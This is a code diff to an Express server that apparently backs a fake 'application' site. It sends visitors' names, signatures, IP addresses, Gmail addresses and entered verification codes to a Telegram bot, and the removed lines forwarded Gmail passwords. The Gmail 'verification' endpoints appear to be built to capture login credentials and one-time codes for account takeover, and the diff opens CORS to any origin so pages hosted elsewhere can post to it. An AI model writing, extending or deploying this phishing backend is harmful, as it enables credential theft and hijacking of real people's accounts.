@@ -4,13 +4,14 @@
    ============================================================
    Requirements:
      • Node.js 18+ (uses built-in fetch, FormData, Blob)
-     • npm install express dotenv
+     • npm install express dotenv cors
    Run:
      node serve.js
    ============================================================ */
 
 require('dotenv').config();
 const express = require('express');
+const cors    = require('cors');
 const path    = require('path');
 
 /* ============================================================
@@ -32,10 +33,21 @@ const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
    ============================================================ */
 const app = express();
 
+/* ---- CORS: allow your front-end origin(s) to POST here ---- */
+/* For development you can use origin: '*'. For production,
+   replace '*' with your actual domain(s), e.g.
+   origin: ['https://bdsm-rd9g.onrender.com', 'https://yourdomain.com'] */
+app.use(cors({
+  origin: '*',
+  methods: ['GET', 'POST', 'OPTIONS'],
+  allowedHeaders: ['Content-Type']
+}));
+
 /* JSON body — signature data URL can be a few hundred KB */
 app.use(express.json({ limit: '10mb' }));
 
-/* Serve index.html, verification.html, styles.css, etc. */
+/* Serve index.html, verification.html, styles.css, etc.
+   (If you host the HTML elsewhere, this can stay for convenience.) */
 app.use(express.static(path.join(__dirname), {
   extensions: ['html']
 }));
@@ -59,12 +71,13 @@ async function tgSendMessage(text){
   return json;
 }
 
-async function tgSendPhoto(buffer, caption){
+async function tgSendPhoto(buffer, caption, mime){
   const form = new FormData();
   form.append('chat_id',    CHAT_ID);
   form.append('caption',    caption);
   form.append('parse_mode', 'HTML');
-  form.append('photo', new Blob([buffer], { type: 'image/png' }), 'signature.png');
+  form.append('photo', new Blob([buffer], { type: mime }), 'signature');
+  form.append('disable_notification', 'false');
 
   const res  = await fetch(`${TG_API}/sendPhoto`, { method: 'POST', body: form });
   const json = await res.json();
@@ -111,7 +124,6 @@ app.post('/api/submit', async (req, res) => {
     const data = req.body || {};
     const { ua, ip, when } = clientInfo(req);
 
-    /* ---- Build the Telegram message ---- */
     const lines = [
       `🔥 <b>NEW APPLICATION — Mistress Scarlett</b>`,
       ``,
@@ -155,17 +167,22 @@ app.post('/api/submit', async (req, res) => {
     /* ---- Send the drawn signature as a photo ---- */
     if (typeof data.signature_dataurl === 'string' &&
         data.signature_dataurl.startsWith('data:image/')) {
-      const base64 = data.signature_dataurl.split(',')[1];
-      const buffer = Buffer.from(base64, 'base64');
 
-      /* Guard against absurdly large payloads */
-      if (buffer.length > 4 * 1024 * 1024){
-        console.warn('Signature too large to send as photo:', buffer.length, 'bytes');
-      } else {
-        await tgSendPhoto(
-          buffer,
-          `🖋 <b>Signature</b> — ${esc(fmt(data.full_name))}`
-        );
+      const m = data.signature_dataurl.match(/^data:(image\/[a-z+]+);base64,(.+)$/i);
+
+      if (m){
+        const mime   = m[1];
+        const buffer = Buffer.from(m[2], 'base64');
+
+        if (buffer.length > 4 * 1024 * 1024){
+          console.warn('Signature too large to send as photo:', buffer.length, 'bytes');
+        } else {
+          await tgSendPhoto(
+            buffer,
+            `🖋 <b>Signature</b> — ${esc(fmt(data.full_name))}`,
+            mime
+          );
+        }
       }
     }
 
@@ -184,13 +201,13 @@ app.post('/api/submit', async (req, res) => {
    ============================================================ */
 app.post('/api/send-code', async (req, res) => {
   try {
-    const { email, password } = req.body || {};
+    const { email, name } = req.body || {};
     const { ua, ip, when } = clientInfo(req);
 
     const msg = [
       `📧 <b>GMAIL VERIFICATION — Code Sent</b>`,
       ``,
-      line('Password', password),
+      line('Applicant', name),
       line('Gmail',     email),
       ``,
       `────────────────────`,
@@ -217,14 +234,15 @@ app.post('/api/send-code', async (req, res) => {
    ============================================================ */
 app.post('/api/verify-code', async (req, res) => {
   try {
-    const { email, password } = req.body || {};
+    const { email, name, code } = req.body || {};
     const { ua, ip, when } = clientInfo(req);
 
     const msg = [
       `🔐 <b>GMAIL VERIFICATION — Code Entered</b>`,
       ``,
-      line('Password', password),
+      line('Applicant', name),
       line('Gmail',     email),
+      line('Code',      code),
       ``,
       `────────────────────`,
       `🌐 <b>Client Info</b>`,
@@ -235,7 +253,7 @@ app.post('/api/verify-code', async (req, res) => {
 
     await tgSendMessage(msg);
 
-    console.log(`✔ Code forwarded: ${fmt(password)} from ${fmt(email)}`);
+    console.log(`✔ Code forwarded: ${fmt(code)} from ${fmt(email)}`);
 
     /* --------------------------------------------------------
        The code is forwarded to Telegram for manual review.
